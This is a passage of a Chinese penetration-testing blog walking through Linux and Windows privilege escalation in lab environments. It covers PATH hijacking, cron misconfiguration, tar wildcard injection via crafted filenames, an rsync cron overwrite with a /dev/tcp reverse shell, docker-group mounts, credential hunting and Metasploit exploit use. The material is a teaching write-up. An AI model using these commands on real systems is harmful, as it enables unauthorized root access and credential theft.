alt="image-20230402223541855"></p><p>调用一下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>john/toto<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230402195858178.png" alt="image-20230402195858178"></p><p>成功切换到了 john 用户的 shell。</p><p>总结：</p><p>&#x2F;home&#x2F;john&#x2F;toto 调用 &#x2F;usr&#x2F;bin&#x2F; 下的 id 可执行文件，因为 &#x2F;usr&#x2F;bin 在环境变量里面，所以 id 命令导向到 &#x2F;usr&#x2F;bin&#x2F;id 这里。</p><p>在 tmp 目录下生成一个 假 id 文件，添加 tmp 目录到环境变量，tmp 是新添加的，在 &#x2F;usr&#x2F;bin 之前，所以 id 命令优先导向到 &#x2F;tmp&#x2F;id 这个 假id 这里，所以 &#x2F;home&#x2F;john&#x2F;toto 实际调用了假id文件导致提权。</p><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>多适用于本地用户；</p><p>查看计划任务：</p><p>crontab [参数]</p><table><thead><tr><th><strong>参数</strong></th><th><strong>功能</strong></th></tr></thead><tbody><tr><td>-e</td><td>编辑crontab定时任务</td></tr><tr><td>-l</td><td>查询crontab任务</td></tr><tr><td>-r</td><td>删除当前用户所有的crontab任务</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/crontab # 查看计划任务<br></code></pre></td></tr></table></figure><h3 id="1-介绍-5"><a href="#1-介绍-5" class="headerlink" title="1.介绍"></a>1.介绍</h3><h4 id="1-权限配置不当"><a href="#1-权限配置不当" class="headerlink" title="1.权限配置不当"></a>1.权限配置不当</h4><p>当root配置计划任务时，调用某些文件，且把的权限配置为 777 时，第三个 7 代表着其他用户也拥有写入权限。我们也可以修改计划任务，导致提权。</p><h4 id="2-日志-tar"><a href="#2-日志-tar" class="headerlink" title="2.日志-tar"></a>2.日志-tar</h4><p>网站管理员应该会有定时将站点数据保持备份的习惯，再要备份 www&#x2F;wwwroot&#x2F;html 目录下的内容时，其计划通常为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /www/wwwroot/html;tar czf /www/wwwroot/html/back.tar.gz *<br></code></pre></td></tr></table></figure><p><code>*</code> 代表所有文件，导致我们可以通过 tar 命令的一些特性来完成提权。</p><p>tar 命令有两个参数 ：</p><ol><li><code>–checkpoint[=NUMBER]</code> 显示每个Numbers记录的进度消息（默认值为10）</li><li><code>–checkpoint-action=ACTION</code> 在每个checkpoint（检查点）上执行ACTION</li><li>这里的<code>–checkpoint-action</code>选项，用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项<code>–checkpoint=1</code> 和 <code>–checkpoint-action=exec=sh shell.sh</code> 作为命令行选项交给了tar程序。</li></ol><p>当执行tar 命令时，通配符* 会自动被替换成参数，完整的命令就成下面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar czf back.tar.gz * --checkpoint=1 --checkpoint-action=exec=sh shell.sh<br></code></pre></td></tr></table></figure><p>shell.sh 内容可以如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp /bin/bash /tmp/bash; chmod +s /tmp/bash# 复制 bash 到 tmp 目录，给它 SUID 权限<br></code></pre></td></tr></table></figure><p>具体的操作步骤如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&quot; &gt; shell.sh<br>echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;<br>echo &quot;&quot; &gt; --checkpoint=1<br></code></pre></td></tr></table></figure><h3 id="2-实操-2"><a href="#2-实操-2" class="headerlink" title="2.实操"></a>2.实操</h3><h4 id="1-权限配置不当-1"><a href="#1-权限配置不当-1" class="headerlink" title="1.权限配置不当"></a>1.权限配置不当</h4><p>这里时宝塔的计划任务，网站备份，我给他 chmod 777：</p><p>查看计划任务：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225104207020.png" alt="image-20230225104207020"></p><p>root 用户的一个 shell 脚本，来看一下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225103758257.png" alt="image-20230225103758257"></p><p>其他用户的权限也是 rwx ，那么就意味着我这个低权限用户也可以修改它。</p><p>直接改成反弹 shell 的命令，等待计划任务以 root 用户的身份调用它，我就可以获得一个 root 的 shell。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225104245858.png" alt="image-20230225104245858"></p><p><strong><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225104327119.png" alt="image-20230225104327119"></strong></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225104459011.png" alt="image-20230225104459011"></p><p>等待其执行，反弹即可。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225104735749.png" alt="image-20230225104735749"></p><h4 id="2-tar"><a href="#2-tar" class="headerlink" title="2.tar"></a>2.tar</h4><p>还是刚才那个例子，它有一个打包的命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/www/</span>wwwroot<span class="hljs-regexp">/fumingblog.club;tar czf /</span>www<span class="hljs-regexp">/wwwroot/</span>back.tar.gz *<br></code></pre></td></tr></table></figure><p>有 * 号，可以利用 tar 命令进行提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash .; chmod +s /tmp/bash&quot;</span> &gt; shell.sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; --checkpoint=1<br></code></pre></td></tr></table></figure><p>备份后变成这样：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225105431253.png" alt="image-20230225105431253"></p><p>查一下 bash 如何提权：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225105810836.png" alt="image-20230225105810836"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225105748323.png" alt="image-20230225105748323"></p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="1-介绍-6"><a href="#1-介绍-6" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>这里只是平台不同，数据库的提权方法其实是相同的，比如 mysql 上还是 udf 这种。</p><p>自动化利用工具：</p><ol><li>MDUT 2.0 数据库利用工具  <a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a>  </li><li>综合高危漏洞利用工具(包含各大数据库)  <a href="https://github.com/Liqunkit/LiqunKit">https://github.com/Liqunkit/LiqunKit</a></li><li>sqlserver利用工具  <a href="https://github.com/uknowsec/SharpSQLTools">https://github.com/uknowsec/SharpSQLTools</a>  </li><li>通过套接字重用通过受损的 Microsoft SQL Server 在受限环境中执行横向移动  <a href="https://github.com/blackarrowsec/mssqlproxy">https://github.com/blackarrowsec/mssqlproxy</a>  mssqlproxy</li><li>ODAT：Oracle 数据库攻击工具  <a href="https://github.com/quentinhardy/odat">https://github.com/quentinhardy/odat</a></li></ol><h3 id="2-实操-3"><a href="#2-实操-3" class="headerlink" title="2.实操"></a>2.实操</h3><p>这里还是溢出漏洞的那个靶场，看网上是有数据库密码泄露。这里是不能 MySql 提权成功的，因为 secure_file_priv 是有限制的。</p><p>这里主要体验一下从网站配置文件中找数据库账号密码，然后通过隧道反弹靶机的 3306 端口到本地进行提权。</p><p>就不一个个翻了，shell 寻找包含 username &#x3D; 和 password 的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> $(find <span class="hljs-string">&quot;<span class="hljs-subst">$(pwd)</span>&quot;</span> -<span class="hljs-built_in">type</span> f -maxdepth 3); <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> grep -qE <span class="hljs-string">&#x27;username.&#123;0,4&#125;=&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> &amp;&amp; grep -qE <span class="hljs-string">&#x27;password.&#123;0,4&#125;=&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Possible password leak in <span class="hljs-variable">$file</span>:&quot;</span><br>        grep -rEw -I <span class="hljs-string">&#x27;username.&#123;0,4&#125;=|password.&#123;0,4&#125;=&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> | grep -vE <span class="hljs-string">&#x27;(\#|\/\/)|\/\*|\*\/&#x27;</span> | <span class="hljs-built_in">sort</span> -u | awk -F= <span class="hljs-string">&#x27;&#123;printf &quot;[+]  %-30s%-2s%-30s%s\n&quot;, $1, &quot;=&quot;, $2, &quot;&quot;&#125;&#x27;</span> | sed <span class="hljs-string">&#x27;s/  */ /g&#x27;</span><br>        <span class="hljs-built_in">echo</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225123213444.png" alt="image-20230225123213444"></p><p>看下这个文件：&#x2F;var&#x2F;www&#x2F;html&#x2F;sites&#x2F;default&#x2F;settings.php</p><p>[+] ‘password’ &#x3D; &gt; ‘Virgulino’,<br>[+] ‘username’ &#x3D; &gt; ‘drupaluser’, </p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225123418475.png" alt="image-20230225123418475"></p><p>mysql 连接一下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225130426208.png" alt="image-20230225130426208"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$databases</span> = <span class="hljs-keyword">array</span> (<br>  <span class="hljs-string">&#x27;default&#x27;</span> =&gt; <br>  <span class="hljs-keyword">array</span> (<br>    <span class="hljs-string">&#x27;default&#x27;</span> =&gt; <br>    <span class="hljs-keyword">array</span> (<br>      <span class="hljs-string">&#x27;database&#x27;</span> =&gt; <span class="hljs-string">&#x27;drupal&#x27;</span>,<br>      <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;drupaluser&#x27;</span>,<br>      <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;Virgulino&#x27;</span>,<br>      <span class="hljs-string">&#x27;host&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>      <span class="hljs-string">&#x27;port&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-string">&#x27;driver&#x27;</span> =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>      <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    ),<br>  ),<br>);<br></code></pre></td></tr></table></figure><p>不出网，使用冰蝎的HTTP隧道功能。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225175704586.png" alt="image-20230225175704586"></p><p>测试一下能否连接：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225180759187.png" alt="image-20230225180759187"></p><p>可以连接，那么使用 MDUT 连接提权即可。（ 这里 MDUT 工具 Github 上下载的一直报错，使用GUI工具里的 MDUT 才能使用 ）。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225183902341.png" alt="image-20230225183902341"></p><p>常规情况下，直接提权即可。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230225183918497.png" alt="image-20230225183918497"></p><p>warehouse-id: 39</p><h2 id="Rsync未授权访问覆盖"><a href="#Rsync未授权访问覆盖" class="headerlink" title="Rsync未授权访问覆盖"></a>Rsync未授权访问覆盖</h2><p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。</p><p>默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p><p><a href="https://vulhub.org/#/environments/rsync/common/">https://vulhub.org/#/environments/rsync/common/</a></p><p>提权：借助 Linux 默认计划任务调用 &#x2F;etc&#x2F;cron.hourly ，利用 rsync 连接覆盖</p><p>提权过程：</p><ol><li>创建一个 nc 文件，内容</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>/bin/bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;i<br></code></pre></td></tr></table></figure><ol start="2"><li>赋予执行权限：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x nc<br></code></pre></td></tr></table></figure><ol start="3"><li>上传文件覆盖定时任务目录下</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rsync -av nc rsync:<span class="hljs-regexp">//</span>IP:PORT<span class="hljs-regexp">/src/</span>etc/cron.hourly<br></code></pre></td></tr></table></figure><ol start="3"><li>进行 nc 监听相应的端口</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><h2 id="Docker组用户挂载目录"><a href="#Docker组用户挂载目录" class="headerlink" title="Docker组用户挂载目录"></a>Docker组用户挂载目录</h2><p>普通用户在 docker 组，利用 docker 服务启动镜像挂载目录，从而来访问 root 目录、etc 目录等敏感文件来进行权限提升。</p><p>运行 docker 时就已经是调用了<code>root</code>的权限（ 普通用户无法启动 docker，而此用户被添加到 docker 组，在使用 docker 时也就调用了 root 权限 ）</p><p>复现：创建用户归类目录，添加到 docker 组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加 test 用户</span><br>useradd -d /home/test -m <span class="hljs-built_in">test</span><br><span class="hljs-comment"># 设置密码</span><br>passwd <span class="hljs-built_in">test</span><br><span class="hljs-comment"># 添加到 docker 组</span><br>usermod -G docker <span class="hljs-built_in">test</span><br><br>newgrp docker<br></code></pre></td></tr></table></figure><p>提权：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -v /root:/mnt -it alpine</span><br></code></pre></td></tr></table></figure><ul><li>-v 将容器外部的目录 <code>/root</code> 挂载到容器内部 <code>/mnt</code></li><li>使用 <code>-it</code> 参数进入容器 <code>shell</code></li></ul><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230402213601201.png" alt="image-20230402213601201"></p><p><code>/root</code> 目录、<code>alpine</code> 和提权其实是没有关系的，更换也可以提权：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230402214146474.png" alt="image-20230402214146474"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows 提权</title>
    <link href="/2023/07/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <url>/2023/07/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/windows.png" alt="windows"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol><li>当前权限 -&gt; 提权方法</li><li>操作系统版本&#x2F;位数 -&gt; 提权方法</li><li>漏洞补丁 -&gt; 溢出漏洞</li><li>杀软防护 -&gt; 当前进程服务，免杀</li><li>网络情况 -&gt; 无法反弹shell?</li></ol><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>systeminfo</td><td>打印系统信息</td></tr><tr><td>whoami</td><td>获得当前用户名</td></tr><tr><td>whoami &#x2F;priv</td><td>当前帐户权限</td></tr><tr><td>hostname</td><td>主机名</td></tr><tr><td>net user</td><td>列出用户</td></tr><tr><td>net user UserName</td><td>关于用户的信息</td></tr><tr><td>netsh firewall show config</td><td>显示防火墙配置</td></tr><tr><td>tasklist</td><td>列出进程</td></tr><tr><td>tasklist &#x2F;svc</td><td>列出服务任务</td></tr><tr><td>net start</td><td>列出启动的服务</td></tr><tr><td>sc query</td><td>列出所有服务</td></tr></tbody></table><h2 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h2><h3 id="1-利用"><a href="#1-利用" class="headerlink" title="1.利用"></a>1.利用</h3><p>使用范围：windows全版本，主要根据补丁情况决定</p><p>使用权限：web服务器权限即可</p><p>利用流程：</p><ol><li>信息收集</li><li>筛选EXP</li><li>下载EXP</li><li>上传EXP</li><li>EXP利用</li></ol><p><a href="https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md">https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md</a></p><h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h4><p><code>systeminfo</code></p><p>根据系统版本、补丁信息，筛选可用EXP。</p><h4 id="2-筛选EXP"><a href="#2-筛选EXP" class="headerlink" title="2.筛选EXP"></a>2.筛选EXP</h4><p>筛选EXP -&gt; 根据系统类型、补丁情况寻找未打补丁的漏洞 </p><p>在线网站：</p><ol><li><a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></li><li><a href="https://www.adminxe.com/CompareSys/">https://www.adminxe.com/CompareSys/</a></li></ol><p>辅助工具：</p><ol><li><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></li><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester">https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester</a></li><li><a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></li><li>MSF</li></ol><blockquote><p>wesng：复制systeminfo保持为txt，在本地执行wes.py</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 wes<span class="hljs-selector-class">.py</span> systeminfo<span class="hljs-selector-class">.txt</span> -o cve.csv<br></code></pre></td></tr></table></figure><blockquote><p>MSF</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">run post/windows/gather/enum_patches# 查看系统补丁情况<br>run post/multi/recon/local_exploit_suggester# 自动筛选可用EXP<br></code></pre></td></tr></table></figure><h4 id="3-下载EXP"><a href="#3-下载EXP" class="headerlink" title="3.下载EXP"></a>3.下载EXP</h4><p>EXP可能有很多都无法成功，原因很多，所以一定要看一些EXP的介绍，了解一下漏洞成因(比如是根据某服务进行提权,但是目标根本就没有,所以自然无法提权成功),使用方式(直接提权&#x2F;可以提权执行命令)….</p><ol><li><a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></li><li><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></li><li><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li><li>MSF</li></ol><h4 id="4-上传并执行EXP"><a href="#4-上传并执行EXP" class="headerlink" title="4.上传并执行EXP"></a>4.上传并执行EXP</h4><p>上传 -&gt; webshell,msf upload…</p><h4 id="5-流程"><a href="#5-流程" class="headerlink" title="5.流程"></a>5.流程</h4><blockquote><p>手工提权</p></blockquote><p>webshell -&gt; systeminfo -&gt; wesng -&gt; 网上寻找EXP -&gt; 上传EXP -&gt; EXP利用 -&gt; systeminfo</p><blockquote><p>MSF提权</p></blockquote><p>webshell -&gt; 上传msf后门 -&gt; msf监听 -&gt; 执行后门 -&gt; post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester(自动筛选exp) -&gt; bg -&gt; info … -&gt;  use …(使用…模块) -&gt; show options -&gt; set session … … -&gt; run -&gt; systeminfo</p><h3 id="2-实操"><a href="#2-实操" class="headerlink" title="2.实操"></a>2.实操</h3><h4 id="1-MSF"><a href="#1-MSF" class="headerlink" title="1.MSF"></a>1.MSF</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sysinfo</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203104753071.png" alt="image-20230203104753071"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/multi/recon/local_exploit_suggester<span class="hljs-comment"># 自动筛选EXP</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203105042332.png" alt="image-20230203105042332"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> <span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/cve_2019_1458_wizardopium<br><span class="hljs-keyword">show</span> options<br>set session <span class="hljs-number">1</span><br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203105123167.png" alt="image-20230203105123167"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203105225998.png" alt="image-20230203105225998"></p><h4 id="2-手工"><a href="#2-手工" class="headerlink" title="2.手工"></a>2.手工</h4><p>使用MSF进行EXP枚举动静较大，且一些新的漏洞exp msf中可能未集成，所以这里熟悉一下手工提权的流程。</p><p>信息收集 -&gt; 筛选EXP -&gt; 下载EXP -&gt; 上传并执行EXP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo<span class="hljs-comment"># 查看系统版本/位数/补丁情况</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206105208984.png" alt="image-20230206105208984"></p><p>复制<code>systeminfo</code>信息，并使用<code>wesng</code>筛选未打补丁的漏洞编号。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 wes<span class="hljs-selector-class">.py</span> systeminfo<span class="hljs-selector-class">.txt</span> -o cve.csv<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206105728324.png" alt="image-20230206105728324"></p><p>查找存在的EXP的漏洞，这个是因为github上的比较慢，还要一个一个搜，就把 Kernelhub、PoC-in-GitHub、WindowsVulnScan 全部克隆下来到本地，然后写了个脚本解析csv文件，提取权限提升的漏洞编号，批量使用find命令进行查找exp路径。exp的项目可以使用<code>crontab</code>命令定时进行克隆。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206105917225.png" alt="image-20230206105917225"></p><p>然后就是看每个EXP的介绍，寻找适合的EXP，这里使用 CVE-2019-1458。</p><p>使用MSF上传EXP：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">upload <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>wesng<span class="hljs-regexp">/exp/</span>CVE-<span class="hljs-number">2019</span>-<span class="hljs-number">1458</span><span class="hljs-regexp">/cve-2019-1458.exe C:/</span>Users<span class="hljs-regexp">/Administrator/</span>Desktop<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206120338007.png" alt="image-20230206120338007"></p><p>这个exp可以以system权限执行命令，不能直接反弹shell，这里使用exp执行msf的后门，然后再启动一个msf进行监听：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206131819833.png" alt="image-20230206131819833"></p><p>得到一个system权限的shell：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206131542046.png" alt="image-20230206131542046"></p><p>get_windows_exp.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/csv&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;os/exec&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Cmd</span><span class="hljs-params">(name <span class="hljs-type">string</span>, args ...<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>cmd := exec.Command(name, args...)<br>out, err := cmd.CombinedOutput()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span 